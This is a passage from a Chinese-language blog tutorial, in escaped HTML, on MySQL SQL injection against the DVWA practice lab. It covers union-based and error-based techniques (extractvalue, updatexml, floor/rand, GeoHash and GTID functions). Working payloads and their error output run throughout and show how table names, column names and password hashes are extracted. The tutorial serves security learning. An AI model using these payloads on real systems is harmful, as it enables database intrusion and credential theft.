          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;ORDINAL_POSITION&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列在表中的位置顺序（一个从1开始的数字）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;DATA_TYPE&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列的数据类型，例如 &lt;code&gt;varchar&lt;/code&gt;, &lt;code&gt;int&lt;/code&gt;, &lt;code&gt;text&lt;/code&gt; 等&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;COLUMN_KEY&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列是否为键（索引）。&lt;code&gt;PRI&lt;/code&gt; 代表主键, &lt;code&gt;UNI&lt;/code&gt; 代表唯一键, &lt;code&gt;MUL&lt;/code&gt; 代表可重复的索引&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;COLUMN_DEFAULT&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列的默认值（如果设置了）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;IS_NULLABLE&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列是否允许为 &lt;code&gt;NULL&lt;/code&gt; 值 (&lt;code&gt;YES&lt;/code&gt; 或 &lt;code&gt;NO&lt;/code&gt;)。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;CHARACTER_MAXIMUM_LENGTH&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录字符串类型列的最大长度。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;同样借此获取users表的字段：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626144509634&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这样就得到了users表的所有的列名称&lt;/p&gt;
&lt;h3 id=&#34;7获取字段信息&#34;&gt;7.获取字段信息
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知道了表名和列名，就能轻松获取对应信息了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如我想获取所有用户的id名称和对应密码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select group_concat(user_id,first_name),group_concat(password) from users #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626145455797&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们在这里使用group_concat拼接了两组字符串，因为select输出的数量必须与字段数一致，这里是2&lt;/p&gt;
&lt;h3 id=&#34;8逐行获取信息&#34;&gt;8.逐行获取信息
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;书接上文，如果我只想要显示某一条信息，就可以在末尾加上&lt;code&gt;limit m,n&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;意思是从第m条数据开始，显示包括n条数据，比如&lt;code&gt;limit 0,1&lt;/code&gt;，就是只显示第1条数据（数据从0开始存储）&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 1,1 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627113327247&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这里使用&lt;code&gt;limit1,1&lt;/code&gt;，就只显示了第二条数据&lt;/p&gt;
&lt;h2 id=&#34;2-报错注入&#34;&gt;#2 报错注入
&lt;/h2&gt;&lt;p&gt;如果union被过滤，或者页面没有回显但SQL语句执行可以输出错误信息，就可以使用基于报错的注入攻击&lt;/p&gt;
&lt;p&gt;报错注入就是人为制造错误条件，让查询结果在报错信息中被“带出”&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;报错注入最好使用and，因为我们的目的是保证语句执行错误，产生错误信息&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;常用函数-1&#34;&gt;常用函数
&lt;/h3&gt;&lt;p&gt;在mysql高版本**（大于5.1版本）**中添加了对XML文档进行查询和修改的函数&lt;code&gt;updatexml()&lt;/code&gt;和&lt;code&gt;extractvalue()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当这两个函数在执行时，如果出现xml文档路径错误就会产生报错&lt;/p&gt;
&lt;h4 id=&#34;extractvalue-xml_document-xpath_string&#34;&gt;extractvalue (XML_document, XPath_string)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;第一个参数：&lt;code&gt;XML_document&lt;/code&gt; 是目标XML文档&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第二个参数：&lt;code&gt;XPath_string&lt;/code&gt; &lt;strong&gt;是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;我们可以利用concat拼接任意非法字符和查询语句/函数，这样想要得到的内容就会随着报错一并回显：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~dvwa~&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;我们使用了&lt;code&gt;database()&lt;/code&gt;函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;updatexml-xml_document-xpath_string-new_value&#34;&gt;updatexml (XML_document, XPath_string, new_value)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;第一个参数：&lt;code&gt;XML_document&lt;/code&gt; 是目标XML文档&lt;/li&gt;
&lt;li&gt;第二个参数：&lt;code&gt;XPath_string&lt;/code&gt; &lt;strong&gt;是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;第三个参数：&lt;code&gt;new_value&lt;/code&gt; 用来替换查找到的符合条件的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也是同理会报错&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;之后的演示我会以&lt;code&gt;updatexml()&lt;/code&gt;和&lt;code&gt;extractvalue()&lt;/code&gt;为主&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;但在此之前，我还想介绍一些其他的好玩的函数(当然也很有用!）👇&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;不那么常用的函数&#34;&gt;不那么常用的函数
&lt;/h3&gt;&lt;h4 id=&#34;floor函数8xmysql50&#34;&gt;floor函数(8.x&amp;gt;mysql&amp;gt;5.0）
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;floor()&lt;/code&gt;：对结果取整（向下舍入）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这不是一个单独使用的函数，而是需要与&lt;code&gt;rand()&lt;/code&gt;, &lt;code&gt;count(*)&lt;/code&gt;和&lt;code&gt;group by&lt;/code&gt;结合使用，来触发&lt;strong&gt;主键重复错误&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;),&lt;span style=&#34;color:#e06c75&#34;&gt;concat&lt;/span&gt;((&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;database&lt;/span&gt;()),&lt;span style=&#34;color:#e06c75&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;))&lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;information_schema&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;group&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;)&lt;span style=&#34;color:#e06c75&#34;&gt;a&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;								      ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	这里插入你想进行的查询语句，只能有一个返回值，因为&lt;span style=&#34;color:#e06c75&#34;&gt;concat函数值只接受单值&lt;/span&gt;，最好使用&lt;span style=&#34;color:#e06c75&#34;&gt;limit语句&lt;/span&gt;，比如：
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;),&lt;span style=&#34;color:#e06c75&#34;&gt;concat&lt;/span&gt;((&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;information_schema&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;table_schema&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;dvwa&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;limit&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;),&lt;span style=&#34;color:#e06c75&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;))&lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;information_schema&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;group&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;)&lt;span style=&#34;color:#e06c75&#34;&gt;a&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，我们输入这样的注入语句：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们看看每一个部分的作用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;floor(rand(0)\*2)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rand()&lt;/code&gt;函数会产生一个0到1之间的随机数。但当给它一个固定的种子（seed），如&lt;code&gt;0&lt;/code&gt;时，它产生的“随机数”序列就变成&lt;strong&gt;完全可预测&lt;/strong&gt;的了&lt;/p&gt;
&lt;p&gt;最终，&lt;strong&gt;&lt;code&gt;floor(rand(0)*2)&lt;/code&gt;会稳定地产生这样一个序列：&lt;code&gt;0, 1, 1, 0, 1, 1, 0, ...&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;concat((select database()), floor(rand(0)\*2))&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这部分将我们要查询的数据与上面产生的&lt;code&gt;0&lt;/code&gt;或&lt;code&gt;1&lt;/code&gt;拼接起来&lt;/p&gt;
&lt;p&gt;因此，它会生成一系列的字符串，如 &lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;, &lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;, &lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;, &lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;... from information_schema.tables group by x&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;from information_schema.tables&lt;/code&gt;：这里只是为了提供足够的数据行（至少3行）来让&lt;code&gt;group by&lt;/code&gt;操作得以触发错误，&lt;strong&gt;任何行数足够的表都可以&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;group by x&lt;/code&gt;：这是触发错误的关键，它会根据我们上面生成的字符串（如&lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;, &lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;）进行分组和计数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;select 1 from ...&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;把返回两列的内部查询包装成只返回一列（内容是&lt;code&gt;1&lt;/code&gt;）的、语法正确的子查询&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来，我们需要知道两个关键点：&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;1.group by在执行时，会建立一个虚拟的临时表，用于存放分组的键(key)和count(*)计数值&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;2.在执行插入操作前，sql会再次查询当前要插入的键，因此rand()会再次执行&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;现在来看看错误是怎样发生的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;逐行处理&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;第一行：调用&lt;code&gt;rand()&lt;/code&gt;，计算出的键是&lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;，临时表中没有这个键，sql准备插入，此时第二次调用&lt;code&gt;rand()&lt;/code&gt;，计算出&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;插入&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（也就是说，想插入的是0，却插入了1）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第二行：此时&lt;code&gt;rand()&lt;/code&gt;第三次被调用，计算出的键是&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;，临时表中已经有了，不用插入，计数值加一就行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（注意：sql这里一开始就没有打算插入，而是选择count+1）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;触发错误&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;第三行：此时&lt;code&gt;rand()&lt;/code&gt;第四次被调用，计算出的键是&lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;，表里没有这个键，所以sql准备插入，此时第五次调用&lt;code&gt;rand()&lt;/code&gt;，计算出&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;插入&lt;/p&gt;
&lt;p&gt;等等，不对！表里已经有&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;了！&lt;/p&gt;
&lt;p&gt;这就导致sql尝试插入一个已经存在的键，从而触发了**“主键重复”（&lt;code&gt;Duplicate entry&lt;/code&gt;）的错误：**&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Duplicate entry &amp;#39;dvwa1&amp;#39; for key &amp;#39;group_key&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;这样，就把数据库名称带了出来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同时，我们还能总结出这样的规律：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;对于一个整数x通过floor(rand(x)*2)产生的序列：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;如果在未出现&lt;code&gt;0011&lt;/code&gt;或&lt;code&gt;1100&lt;/code&gt;序列前出现&lt;code&gt;0010&lt;/code&gt;或&lt;code&gt;1101&lt;/code&gt;，那么该序列可用于报错型sql盲注&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考文档：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_35544379/article/details/77453019&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SQL报错型盲注教程
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;a class=&#34;link&#34; href=&#34;https://www.secpulse.com/archives/140616.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;关于floor()报错注入，你真的懂了吗？
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;st_latfromgeohashgeohash_string&#34;&gt;ST_LatFromGeoHash(geohash_string)
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;参数是一个GeoHash格式的字符串，如果格式不对，函数就会报错，并可能返回导致错误的非法字符串&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;和XPath_string一样，&lt;code&gt;~&lt;/code&gt;不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FUNCTION dvwa.ST_LatFromGeoHash does not exist
		           ↑↑↑↑↑
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;st_longfromgeohashgeohash_string&#34;&gt;ST_LongFromGeoHash(geohash_string)
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;利用原理与&lt;code&gt;ST_LatFromGeoHash&lt;/code&gt;完全相同&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;st_pointfromgeohashgeohash_string-srid&#34;&gt;ST_PointFromGeoHash(geohash_string, srid)
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;好吧和上面还是一样的&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;gtid_subsetsubset-set&#34;&gt;GTID_SUBSET(subset, set)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;第一个参数： &lt;code&gt;subset&lt;/code&gt;一个GTID（全局事务标识符）集合。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第二个参数： &lt;code&gt;set&lt;/code&gt;另一个GTID集合。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个合法的GTID单元由两部分组成，用冒号隔开：&lt;code&gt;source_id:transaction_id&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当任意一个参数不是合法的GTID集合格式时，函数就会报错，并可能返回非法参数的内容&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and GTID_SUBSET(database(), 1)#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;报错结果：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FUNCTION dvwa.GTID_SUBSET does not exist
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;爆破数据库名称&#34;&gt;爆破数据库名称
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,database(),0x7e)) #

1&amp;#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;出现下面报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~dvwa~&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这就得到了数据库的名称：dvwa&lt;/p&gt;
&lt;p&gt;可能你会有疑惑，为什么要用&lt;code&gt;~&lt;/code&gt;包裹内容呢？&lt;/p&gt;
&lt;p&gt;这一方面是方便我们看返回的结果，另一方面嘛，我们接着往下看&lt;/p&gt;
&lt;h3 id=&#34;爆破表名&#34;&gt;爆破表名
&lt;/h3&gt;&lt;p&gt;由于 extractvalue() 最大返回长度为 32 ，所以最好用 limit N,1 一行一行的进行回显&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 0,1),0x7e)) #

1&amp;#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; limit 1,1),0x7e)) #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分别出现下面报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~guestbook~&amp;#39;

XPATH syntax error: &amp;#39;~users~&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而如果不用limit语句，则会出现下面的报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Subquery returns more than 1 row
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;这不是我们想要的，所以limit语句很重要！&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;爆破列名&#34;&gt;爆破列名
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 3,1),0x7e)) #

1&amp;#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 4,1),0x7e)) #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分别出现下面报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~user~&amp;#39;

XPATH syntax error: &amp;#39;~password~&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;爆破字段内容&#34;&gt;爆破字段内容
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and extractvalue(1,concat(0x7e,(select concat_ws(&amp;#39;,&amp;#39;,user,password) from users limit 0,1),0x7e)) #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;出现下面的报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~admin,5f4dcc3b5aa765d61d8327deb&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里我们使用了&lt;code&gt;concat_ws&lt;/code&gt;函数，指定把&lt;code&gt;user&lt;/code&gt;和&lt;code&gt;password&lt;/code&gt;字段使用&lt;code&gt;,&lt;/code&gt;拼接再返回，这样就能实现查询多列&lt;/p&gt;
&lt;p&gt;如果不使用，就会出现下面的报错：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Operand should contain 1 column(s)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然而，正如上面所说，&lt;code&gt;extractvalue()&lt;/code&gt; 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有&lt;code&gt;~&lt;/code&gt;看出来**（所以两边都加&lt;code&gt;~&lt;/code&gt;是比较明智的选择）**&lt;/p&gt;
